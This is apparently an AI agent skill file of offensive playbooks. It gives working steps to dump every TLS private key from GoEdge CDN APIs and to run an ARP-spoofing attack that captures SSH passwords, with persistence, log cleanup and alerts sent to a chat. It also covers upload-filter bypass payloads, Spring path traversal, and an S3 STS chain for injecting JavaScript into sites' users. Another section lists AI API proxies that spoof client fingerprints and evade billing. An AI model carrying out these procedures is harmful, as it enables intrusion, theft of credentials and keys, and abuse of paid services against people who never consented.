---
name: specialized-attack-playbooks
description: >-
  Specialized hands-on exploitation: GoEdge private-key dumping, gray-market CDN forensics, ARP MITM, CDN→S3 STS chain, BT Panel + UniApp, AI IDE API reverse proxy, OCS + MinIO; includes references/scripts support-file index. Use when applying specialized playbooks for GoEdge, CDN, ARP MITM, BT Panel, OCS, MinIO.
metadata:
  tags: [penetration-testing, red-team]
---

## Specialized Hands-On Exploitation (fully inlined)

### GoEdge CDN (port 8002) bulk private-key exfiltration
```
Fingerprint: curl -s http://T:8002/ → {"message":"Welcome to API"} | POST /SSLCertService/findEnabledSSLCertConfig → requires X-Cloud-Access-Token
Flaw: findEnabledSSLCertConfig validates identity but not scope → any admin key can dump every TLS private key in the system (keyData=plaintext PEM base64)
Two-step auth: POST /APIAccessTokenService/getAPIAccessToken {"accessKeyId":AK,"accessKey":SK,"type":"admin"} → data.token
          Subsequent requests carry Header X-Cloud-Access-Token: <token>
Bulk extraction (Python): for id in range(1,500): POST /SSLCertService/findEnabledSSLCertConfig {"sslCertId":id} headers={token}
  → r.json()['data']['sslCertJSON'] base64 decode → json → dnsNames + keyData (base64 PEM private key) | skip b64=="bnVsbA==" (null)
Assets: Fofa app="GoEdge"&&port="8002" / Shodan http.title:"GoEdge" port:8002 / "Welcome to API" port:8002
Exploitation: private key → MITM / traffic decryption / forged certs | AK/SK credential reuse against other GoEdge instances | admin access to CDN edge nodes
```

### Gray-market CDN post-exploitation forensics (after taking the CDN, work out what it operates)
```
Five steps: 1) enumerate every certificate (IDs 1-500; expired/disabled ones still hold private keys and reveal historical operations) 2) keyword-based first-pass classification 3) real-visit verification (critical! never trust cert domains alone;
      use requests following redirects, inspect final landing page title/meta/h1/JS redirects) 4) reclassify by real content 5) flag high-value targets
Keyword matrix (dnsNames classification): wallet phishing tokenpocket/tokenpoket (typosquatting)/metamask/trust | payment fraud paypal/wxpay/bayspay/147pay
  adult paid site farms xiuren/xrw/sood/laikantu/tuhaokan/kantu | pirated video 7she/acgzy/yiyiyi/dilige/80sjdy/mogudong
  VPN censorship bypass futo-on/xyou/gogocloud/douyinjiasu/tudoujiasu | generic site-farm SEO 0x000/tc7/vn00/fc000/ikkk (programmatic wildcard redirect chains) | lottery fraud 0149/dh49/999pian (pian = scam)
High-value marking: grade A valid wallet/payment private keys inside validity → MITM / HTTPS phishing green padlock | grade B ACME auto-renewing certs for continuous monitoring | grade C AK/SK credential reuse + WHOIS correlation to the operator's other assets
Tells (🔴 very high): normal + adult + pirated sites co-hosted on one server | mass wildcard certs for site farms | brand domain and lookalike domain on the same CDN (insider-run phishing) | a single admin key can export all private keys (GoEdge has no isolation by default)
```

### ARP MITM on the same L2 to steal SSH passwords (target on same subnet, password unknown)
```
Applies: target on the same L2 (same Hyper-V host / same VLAN) + have a compromised jump host + target SSH password unknown
🚨 Key pitfall: arpspoof reports "couldn't arp for host" (libnet MAC resolution often times out on Hyper-V/CentOS7)
  Fix: ip neigh replace TARGET_IP lladdr TARGET_MAC dev eth0 nud permanent (prefill the gateway the same way) → skips libnet resolution, arpspoof then works
Deploy: echo 1>/proc/sys/net/ipv4/ip_forward | arpspoof×4 both directions (one process per side of target↔gateway) | tcpdump -w x.pcap -s0 -C100 -W10 host target
  dsniff -i eth0 -w /tmp/dsniff.log (dedicated to capturing plaintext SSH/FTP/HTTP passwords)
Persistence: crontab '*/2 * * * * /root/mitm_chk.sh' to reassert + rc.local for boot autostart
Verify: pgrep -c arpspoof == 4 | tcpdump -r x.pcap to confirm target traffic is captured
Event notification: hermes cron create 'every 2 minutes' --no-agent --deliver feishu:chat_id (notify only when there is a catch: the script detects new dsniff log content → stdout output → delivered; silent when nothing new)
Cleanup: pkill arpspoof/tcpdump/dsniff | echo 0>ip_forward | remove mitm lines from crontab | ip neigh del each entry | rm pcap/log
```

### Multi-layer domain-rotation anti-block CDN → S3 STS credential escalation chain
```
Architecture recognition: entry domain → JS redirect layer 1 (random subdomain + wildcard DNS) → redirect layer 2 → real business site (static landing)
  CDN traits: Server: Xcdn | "Please access via the domain name" | 987dns.com domestic DNS scheduling (overseas returns 0.0.0.0)
  Key break points:
    1) The real business site's inline JS exposes the mainDomains list (nested layer by layer) + base64-encoded sub-site redirect config
    2) The deepest landing page references resources on source sites outside the CDN (ug458.com/idcpc8.com etc.) → bypass the CDN and hit the origin directly
    3) The origin is S3 (AmazonS3 header / public ListBucket) → leaks the bucket name
    4) The same site offers an APK download → reverse it to extract API domains + AES keys + the STS acquisition path
    5) register → login → JWT → /BBS/GetSTSToken → AWS STS temporary credentials (PutObject permission)
    6) S3 write = origin tampering = JS injection for all users (equivalent to RCE)

  Technical details:
    AES-CBC encrypted API traffic: the key is exposed both in frontend JS (lazyDecryptImg.js) and in .so strings of the APK
    ASP.NET backend: infer from validation error format + traceId | prefer form-urlencoded (JSON may return 415)
    Registration unvalidated: no SMS / no captcha / any phone number → bulk registration possible
    STS over-privilege: the ordinary user role gets s3:PutObject → overwrite origin files
    S3 bucket ListBucket public: the prefix parameter is ineffective (CDN cache), but hitting the S3 domain directly allows full enumeration
  Reference: references/cdn-antiblock-s3-attack-chain.md
```

### BT Panel penetration + UniApp/DCloud APK reversing
```
=== BT Panel fingerprinting ===
Fingerprint: port 19362/8888/random high port + Cookie name containing a 32-char MD5 hash + "_ssl" suffix (e.g. 721301c19a31e887cb1f5a5726fbaae5_ssl)
  A Set-Cookie in a 404 response = confirmed BT Panel; port 888 usually serves phpMyAdmin (403 = IP allowlist)
Security entrance: new BT Panel versions force a random 8-char path (/xxxxxxxx/); the panel is unreachable without guessing it. All API endpoints sit behind the security entrance path.
  Brute-force strategy: domain-related variants (bt + domain prefix) + common ops habits (admin888/bt123456/btpanel) + 8-char random (very low hit rate)
  Bypass: no known universal bypass (2024+); the old CVE-2023-38038 (phpmyadmin unauth) only affects <=7.7
  Lateral approach: multiple sites on one IP share BT Panel → break the weakest site → pivot to the target site; BT Panel's default www user manages every site

=== UniApp/DCloud APK reversing (very effective) ===
Identify: assets/dcloud_uniplugins.json + assets/apps/<appid>/ + uni-jsframework.js
Core: all business logic lives in the JS/Vue files under assets/apps/<appid>/www/ (no jadx Java decompilation needed)
  API extraction: grep -r 'https\?://' assets/apps/ | filter baseURL/apiUrl/request config
  Auth: grep token/key/secret/Authorization → hardcoded credentials are common in config.js/env.js/manifest.json
  Crypto: grep aes/encrypt/decrypt/sign → frontend crypto = plaintext (the key must be in the JS)
  WebSocket: grep wss://ws:// → realtime backend addresses
Priority: manifest.json (appid/version/permissions) → config or env JS (API address) → page JS (business logic/IDOR)

=== ChengZi site builder (d3504.cn) SDK decryption ===
Scenario: adult/gray-market APP distribution landing pages commonly use ChengZi for no-fill invites + redirects + APK distribution
init3 endpoint: POST /web/<appkey>/<channel>/init3 → returns URL-safe base64 encoded XOR-encrypted data
Decrypt: base64url_decode → XOR every byte with 0x96 → JSON (contains fu=download URL, ph=installer path, fm=redirect mode)
  Script: scripts/chengzi_decrypt.py
Exploitation: decrypt to get the real APK's Alibaba Cloud FC function URL → download the APK → reverse it to extract the backend API
```

### AI IDE API reverse proxy / leaked-key directory (find and evaluate AI coding-tool proxies)
```
Background: Cursor Web free API has had only gemini-3-flash since 2026-04; Claude is cut entirely → getting Claude 4.6+ needs other channels
Working options: freemodel-cc-proxy (free, FreeModel real Claude, spoofs the Claude Code fingerprint to dodge 403, Opus4.8/Sonnet4.6) | WindsurfAPI (dwgx, Windsurf gRPC to API, 100+ models, account-pool rotation)
  askalf/dario (Claude Pro/Max subscription to API, bypasses headless billing) | bypass/chatgpt-adapter (xllm-go, aggregates several reverse-engineered interfaces into OpenAI format)
Dead: cursor2api/cursor2api-go (only gemini-3-flash left) | Auxiliary: claude-tap (MITM interception of real AI Agent traffic to study system prompts/tool calls)
GitHub search method: api.github.com/search/repositories?q=cursor+api+reverse+proxy&sort=stars → filter desc → /repos/<o>/<r>/readme (base64 decode and read) → /search/issues for latest status
Keywords: cursor api reverse proxy / cursor workos token / claude proxy cursor / AI IDE api reverse engineering
```

### OCS live-chat system penetration + MinIO object storage exploitation
```
Discovery entry: a landing page's support-chat link exposes the OCS domain (e.g. leiyushan.com) → load the SPA with Playwright and intercept real API calls
Auth flow: POST /api/v1/v/init {cid,vid} → data.tk = visitor token; subsequent requests use header x-v-token: <token>
Core APIs: /api/v1/v/bc (start chat) /api/v1/v/oss/sign (get upload signature) /api/v1/v/message/send (send message)
Upload chain: GET /api/v1/v/oss/sign → {sn,et,ul,ulw,dir,cid,og} → POST https://UL/api/v1/f/wj/tr
  Headers: sign=<sn>, expTime=<et>  Form: file=@file, cid=<cid>, dir=<dir>, og=<og>, fn=<filename>, fg=0
Blacklist bypass (extensions outside the allowlist are blocked):
  ✓ .jsp.jpg (double extension, last ext passes the check) ✓ .jsp%00.jpg (null-byte truncation) ✓ .jsp;.jpg (Tomcat path parameter)
  ✗ .jsp/.jspx/.JSP/.Jsp/war/php/py/sh/xml/svg/html/txt/json/yaml/properties/sql/doc/ini/conf
⚠️ Files are stored in MinIO object storage = static objects, never executed by Tomcat (RCE needs a write into the webroot)
  Verify: curl https://UL/bucket/dir/date/filename → returns file content (plain text, not executed)
dir parameter traversal: the sign service does not validate dir content (always returns a fixed bucket sign); the upload service checks bucket permissions
  dir=conf → 500 (tries to write the conf bucket but lacks permission) dir=../../ → 500 (traversal rejected)
MinIO Console (port 9001): POST /api/v1/login {"accessKey":"X","secretKey":"Y"} → 403 = invalid Login
  CVE-2023-28432: POST /minio/health/cluster?verify → patched in new versions (returns BadRequest without leaking env)
CDN layer identification (response-size fingerprint):
  CDN WAF block page ~2000 bytes | WSCN JS challenge page ~6000 bytes (embedded iframe) | nginx 404 = 146 bytes
  Spring Boot JSON 404 ~100 bytes | Tomcat HTML 404 ~435 bytes
nginx method restriction: admin paths (/api/v1/a/ /api/v1/s/) allow GET only → POST returns 405
WSCN CDN JS challenge: passed automatically by Playwright | the path allowlist is independent of the JS challenge (after passing the challenge, the path ACL still blocks)
Spring Boot path traversal: /c/..;/path → bypasses the nginx path ACL to reach Spring Boot (the semicolon = Tomcat path-parameter truncation)
BT Panel entrance: Set-Cookie leaks the cookie name → the entrance path is random and not derivable, so it can only be brute-forced
Longteng CDN: the TLS certificate exposes all associated domains | the Server header exposes the origin OS version
```

## Support file index

```
=== references/ attack-chain write-ups ===
cdn-antiblock-s3-attack-chain.md        multi-layer domain-rotation anti-block CDN → S3 STS credential escalation chain
faka-system-attack-chain.md             card-selling system (XHFAKA/Xinghai) enumeration / second-order XSS / lockout bypass / WAF blind spots
ocs-im-system-attack-chain.md           full attack chain against the OCS live-chat IM system
ocs-minio-upload-attack-chain.md        OCS upload → MinIO object storage exploitation chain
chinese-app-distribution-pentest.md     pentesting domestic gray-market APP distribution landing pages (ChengZi/FC/CDN)
phpcms-v9-attack-surface.md             PHPCMS V9 attack surface

=== references/ CDN/Spring/WebSocket bypass ===
spring-boot-cdn-bypass.md               Spring Boot Actuator path traversal + interceptor bypass
cdn-waf-bypass-spring-boot.md           CDN WAF bypass (502/JS challenge) + Spring backend
cdn-bypass-gccdn-ocs.md                 GCCDN/WSCN response-filter bypass
cdn-websocket-bypass-spring-auth.md     WebSocket upgrade bypassing the CDN to reach Spring
stomp-websocket-cdn-bypass.md           STOMP over SockJS CDN bypass
sockjs-stomp-exploitation.md            SockJS/STOMP privilege escalation + SpEL injection
spring-stomp-sockjs-exploitation.md     Spring STOMP auth + unauthorized subscription

=== references/ nginx/PHP fingerprinting ===
nginx-pathinfo-bypass-and-fingerprint.md   PATH_INFO deny bypass + response-size fingerprinting
nginx-php-fingerprint-bypass.md            nginx/PHP-FPM fingerprint differentials
nginx-404-differential-fingerprinting.md   catch-all vs genuine 404 differential enumeration

=== references/ APK reversing ===
uniapp-apk-reverse-engineering.md       full UniApp/DCloud reversing (JS/.so/.dat)
uniapp-apk-reversing.md                 UniApp reversing quick reference (RC4 deobfuscation + domain discovery)
uniapp-dcloud-apk-reversing.md          DCloud structure + HTTPDNS identification
bt-panel-attack-methodology.md          BT Panel fingerprinting + entrance brute force + lateral movement

=== scripts/ ===
js_rc4_deobfuscate.js       JS RC4 + string-array rotation deobfuscation (extract → decode with node)
chengzi_decrypt.py          ChengZi init3 XOR decryption (fu download URL)
decrypt_aes_cbc_api.py      AES-CBC encrypted API traffic decryption template (hardcoded key/iv)
s3_sts_exploit.py           AWS S3 STS temporary credential exploitation (verify/list/write/permission enumeration)
stomp_sockjs_exploit.py     STOMP over SockJS exploitation template (CDN bypass + auth + injection)
spring_stomp_exploit.py     Spring STOMP unauthorized subscribe/send
```
